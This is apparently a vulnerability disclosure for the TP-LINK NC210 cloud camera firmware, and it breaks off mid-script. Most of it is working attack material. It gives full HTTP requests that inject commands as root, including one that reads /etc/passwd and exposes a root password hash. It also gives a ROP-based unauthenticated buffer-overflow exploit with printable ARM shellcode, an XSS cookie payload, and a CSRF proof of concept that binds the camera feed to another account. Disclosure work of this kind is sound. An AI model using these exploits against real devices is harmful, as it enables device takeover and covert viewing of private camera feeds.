# Affected products

Only one product has been tested, other products may be affected. The test was
performed on the following:

- TP-LINK Cloud Camera NC210, firmware 1.0.4 Build 160412 Rel.27736

# Severity

Below is a summary of vulnerabilities and risk:

1. Authenticated command injection - run commands as root through the administrative web
interface
1. Buffer overflow - denial-of-service and potentially remote code execution,
one of which is unauthenticated
1. XSS - steal credentials and perform administration of the camera
1. CSRF - hijack the camera and view its feed remotely


# Technical Details

All the vulnerabilities were found in the binary: '/usr/local/sbin/ipcamera'.

## Command Injection

Two command injection vulnerabilities were found, both can be exploited by an
administrative user on the web interface.

### Command injection 1 - settimezone.fcgi

The parameter 'timezone' in the request below is vulnerable to command
injection. The string after ```GMT-``` will be used unfiltered as input to a
command.

~~~
POST /settimezone.fcgi HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/index.html
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Content-Length: 53
Cookie: StreamAccount=admin; StreamPassword=[Base64 encoded password]; sess=zj56859s6xbv7id
Connection: close

timezone=GMT-[;cmd injection;]&area=Europe/Oslo&source=Android
~~~

Simplified pesudocode of what happens on the camera is shown below:

~~~
char* timezone = get_parameter("timezone");
char hours[16];
char gmt[24];
strcpy(hours, timezone + 4);
sprintf(gmt, "GMT-%s", hours);
exec("echo %s > %s", gmt, "/usr/local/etc/TZ");

void exec(char* c, ...)	{
	char cmd[0x400];
	va_list arg;
	va_start(arg, c);
	vsnprintf(cmd, 0x400, c, arg);
	system(cmd);
}
~~~

There is one significant restriction on this vulnerability, the maximum length
of commands is 15 characters (excluding last zero-byte). Although this is a
restriction, it is also a vulnerability as a buffer overflow is triggered if the
string is longer (this is discussed later).

Command injection can be verified by starting a Telnet-server, the full request
can be seen below:

~~~
POST /settimezone.fcgi HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/index.html
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Content-Length: 53
Cookie: StreamAccount=admin; StreamPassword=[Base64 encoded password]; sess=zj56859s6xbv7id
Connection: close

timezone=GMT-;telnetd;&area=Europe/Oslo&source=Android
~~~

It was possible to verify the command with Nmap, however it was not possible to
login. For an unknown reason, the Telnet-server would acknowledge the
TCP-handshake and immediately close the connection.


### Command injection 2 - iperf.cgi

The second command injection is in 'iperf.cgi' and the 'ip'-parameter.

~~~
POST /iperf.fcgi HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/index.html
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Content-Length: 79
Cookie: StreamAccount=admin; StreamPassword=[Base64 encoded password]; sess=zj56859s6xbv7id
Connection: close

op=client&ip=[;cmd injection;]&sec=1&para=1
~~~

Below is a request to read the file '/etc/passwd' and output the data to a
file we can read through the web server.

~~~
POST /iperf.fcgi HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/index.html
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Content-Length: 79
Cookie: StreamAccount=admin; StreamPassword=[Base64 encoded password]; sess=zj56859s6xbv7id
Connection: close

op=client&ip=192.168.0.10;cat+/etc/passwd>>/usr/local/www/cmd.txt;&sec=1&para=1
~~~

The result indicates that no error occurred.

~~~
HTTP/1.1 200 OK
Content-Type: text/json
Connection: close
Server: lighttpd/1.4.32-devel-27736
Content-Length: 15

{"errorCode":0}
~~~

The result of the command can be retrieved by sending an unauthenticated request
to the web server.

~~~
GET /cmd.txt HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/
Connection: close
~~~

The result contains the hashed password for the root-user.

~~~
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 51
Connection: close
Server: lighttpd/1.4.32-devel-27736

root:$1$$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh
~~~

Pseudocode for the vulnerable parts of the code is shown below:

~~~
char* ip = get_parameter("ip");
char* secStr = get_parameter("sec");
char* paraStr = get_parameter("para");
int sec = atoi(secStr);
int para = atoi(paraStr);
char cmd[0x80];
snprintf(cmd, 0x80, "iperf -c %s -t %d -f m -i 1 -P %d &", ip, sec, para);
system(cmd);
~~~

## Buffer Overflow

Several buffer overflow vulnerabilities were found in the application.

### Buffer Overflow 1 - Document Root

There is one buffer overflow in each of the three HTML-pages accessible in the root-folder.
Each buffer overflow is triggered by a code like this, where DOCUMENT_ROOT is a GET-parameter:

~~~
char vulnerable[64];
sprintf(vulnerable, "%s%s", get_parameter("DOCUMENT_ROOT"), original_path);
~~~

'original_path' can be one of three strings, depending on which function is called:

1. index.html
1. guest.html
1. login.html

Below are the buffers that must be sent in to overwrite all local variables with
user-specified content and
data after that will overwrite stored register R4, frame pointer (FP) and then
program counter (PC).

***NB!*** Note that 11 bytes are appended after the string we send in
and therefore the buffers below will crash the program. The maximum data that
can be sent in without crashing the program is the buffers below minus 11
characters (original_path + null-byte).

~~~
GET /index.html?DOCUMENT_ROOT=[64B][64B][64B][16B][4B][12B]
~~~

~~~
GET /guest.html?DOCUMENT_ROOT=[64B][64B][64B][16B][4B][12B]
~~~

~~~
GET /login.html?DOCUMENT_ROOT=[64B][64B][24B][12B]
~~~

#### Unauthenticated RCE

TL;DR: The vulnerability in login.html can be triggered by an unauthenticated
user. The exploit developed below is a PoC, however because of ASLR, it is
unreliable and will crash the application in most cases. 

Since the page 'login.html' can be accessed from an unauthenticated user, this
vulnerability was investigated further. The overflow was tested in gdb and the
following offsets where verified:

~~~
| vulnerable | Other variables | Saved registers  |
|    64B     | 64B | 24B | 8B  | R4 | R11/FP | PC |
~~~

At the end of the function, the following code is executed.

~~~
55958:       e8bd8810        pop     {r4, fp, pc}
~~~

In other words, after 160 bytes we start overwriting saved R4-register, then FP
and finally PC-register which controls execution flow. In terms of exploiting
this, below are the highlights:

1. Stack is executable
2. ASLR is used and affects all parts, except the executable's own executable code,
all these memory addresses contain an initial zero-byte
3. Fast CGI is used and if the FCGI-binary crashes it will not be restarted by
the web server immediately. The FCGI-process is checked and restarted about
every 10 minutes.
4. The pthread-library is used to provide a random stack-location at every
CGI-call.
5. The least random parts of the binary I found where in shared libraries.

Since the location of shared libraries seems most predictable, I decided to use
these for ROP. I looked around on the stack and found the address to the query
string, i.e. everything after '?' in the URL. This value is placed at 'SP +
48'. In other words, if we perform 11 pop operations and then pop PC we
could use that address. The new exploit-URL is shown below:

~~~
GET /login.html?[shellcode]&DOCUMENT_ROOT=[Exploit]
~~~

The necessary code to perform 12 pop operations ending in 'pop pc' was found in
several shared libraries, one is '/lib/libm-0.9.32.1.so'. The two operations below
make up 12 pop operations where the last pop is program counter. 

~~~
2260:       e28dd010        add     sp, sp, #16
2264:       e8bd8f70        pop     {r4, r5, r6, r8, r9, sl, fp, pc}
~~~

We now have a somewhat more reliable location to jump to, however there are some
other considerations:

1. The data in the new shellcode-location is not URL-decoded and therefore we
are limited in which characters we can use. To allow exploitation from JavaScript,
I will limit myself to printable ASCII characters.
2. The memory location we jump to is actually minus 1 of where the shellcode is.
The practical implications of this is that we need to ensure that the null-byte
+ our shellcode does not create any damaging shellcode that breaks our future
code.

Because only printable characters are allowed, this location is not used for the
whole shellcode, but just another jump to the real shellcode. The real shellcode
can be placed in the DOCUMENT_ROOT-parameter. The location of this shellcode after
we have made the second jump is at 'SP - 210'.

An example of how this code can be created with printable characters is shown
below (first two instructions set up thumb mode and is not part of the shellcode):

~~~
$ arm-linux-gnueabi-as -mthumb b_js.s && arm-linux-gnueabi-objdump -d a.out

a.out:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:	e28f6001 	add	r6, pc, #1
   4:	e12fff16 	bx	r6
   8:	466f      	mov	r7, sp
   a:	3f6e      	subs	r7, #110	; 0x6e
   c:	3f6e      	subs	r7, #110	; 0x6e
   e:	4738      	bx	r7
~~~

We can verify below that this contains no non-printable characters.

~~~
$ perl -e 'print "\x6f\x46\x6e\x3f\x6e\x3f\x38\x47"' | xxd
00000000: 6f46 6e3f 6e3f 3847                      oFn?n?8G
~~~

The final exploit will look like this:

~~~
GET /login.html?AAAoFn?n?8G&DOCUMENT_ROOT=[URL-encoded shellcode + exploit]
~~~

The exploit was verified to work in a debugger, however it will not be stable 
unless the attacker knows the offset for the shared library used.


### Buffer Overflow 2 - settimezone.fcgi

The vulnerable parameter is the 'timezone'-parameter shown below. The
maximum number of bytes that can be sent in before crashing the program is 19 bytes, when
sending in 20 bytes, the program crashes.

~~~
POST /settimezone.fcgi HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/index.html
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Content-Length: 61
Cookie: StreamAccount=admin; StreamPassword=[Base64 encoded password]; sess=zj56859s6xbv7id
Connection: close

timezone=[20B]&area=Europe/Oslo&source=Android
~~~

Pseudocode of the vulnerable parts were shown above, but is also included below:

~~~
char vulnerable[16];
char* timezone = get_parameter("timezone");
strcpy(vulnerable, (timezone + 4));
~~~


## Cross-Site-Scripting (XSS)

The same vulnerability that causes the buffer overflow in 'index.html' and
'guest.html' can be used to trigger an XSS-vulnerability. The buffer the data
is copied into can hold 64 bytes and after that, the data is copied into the user password
which is printed back to the web page. The vulnerability is shown in the request
below.

~~~
GET /index.html?DOCUMENT_ROOT=[64B]'><script>alert(document.cookie)</script> HTTP/1.1
~~~

A full example is also shown below:

~~~
GET /index.html?DOCUMENT_ROOT=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	'><script>alert(document.cookie)</script> HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/index.html
Cookie: StreamAccount=admin; StreamPassword=[Base64 encoded password]; sess=zj56859s6xbv7id
Connection: close
~~~

The request above returns a response like below:

~~~
HTTP/1.1 200 OK
Content-Type: text/html
Connection: close
Server: lighttpd/1.4.32-devel-27736
Content-Length: 222


<div id='token' style='display:none' value='1yxph57bxp5jftf'></div><div id='n'
style='display:none' value='admin'></div><div id='sec' style='display:none'
value='A'><script>alert(document.cookie)</script>index.html'></div>
~~~

The exploit was verified to work in Firefox.


## Cross-Site-Request-Forgery (CSRF)

The camera can be connected to a cloud-account where it's possible to view the
camera's feed remotely. In the local admin interface it is possible to change
which account the camera should be connected to. The request to connect the
camera to a different account has no CSRF-protection and can therefore be
performed from a different domain.

The exploit is divided into two steps:

1. Unbind the camera from current account.
1. Connect camera to own account.

The HTTP-request to remove current account access to camera is shown below: 

~~~
POST /cloud.fcgi HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/index.html
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Content-Length: 14
Cookie: StreamAccount=admin; StreamPassword=[Base64 encoded password]; sess=zj56859s6xbv7id
Connection: close

command=unbind
~~~

The HTTP-request to connect camera feed to an account is shown below. Below is a
description of the parameters:

1. 'username' and 'password' must belong to a valid account registered
at http://www.tplinkcloud.com/
1. 'cameraname' should contain the name chosen when first configuring the
camera, however the parameter can be removed.
1. 'token' is a random token, presumably for CSRF protection, however it is
not verified on the server. The token
parameter must be present in the request, but it can be set to an empty value
and the request will still be valid.

~~~
POST /cloud.fcgi HTTP/1.1
Host: 192.168.0.10
Referer: http://192.168.0.10/index.html
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Content-Length: 73
Cookie: StreamAccount=admin; StreamPassword=[Base64 encoded password]; sess=zj56859s6xbv7id
Connection: close

command=bind&username=[email]&password=[password]&cameraname=[camera name]
	&token=[random token]
~~~


Without 'cameraname' and 'token' there are not other random or
unpredictable elements in the form and therefore we are able to create a valid
request from a different web site.

A simple PoC to unregister the account and then register a different account
is shown below. The exploit is divided into three pages:

1. ```index.html``` - Create iframes for the other two requests
1. ```unregister.html``` - Perform request to unregister the current account. If no
account is registered, nothing will happen.
1. ```register.html``` - Register a new account.

~~~HTML

<script>
var unregIframe = "<iframe src='/unregister.html' width='0' height='0'></iframe>";
document.getElementById("unregister").innerHTML = unregIframe;

// Wait some time until account has been unregistered
setTimeout(function(){
	var regIframe = "<iframe src='/register.html' width='0' height='0'></iframe>";
	document.getElementById("register").innerHTML = regIframe;
}, 10000);
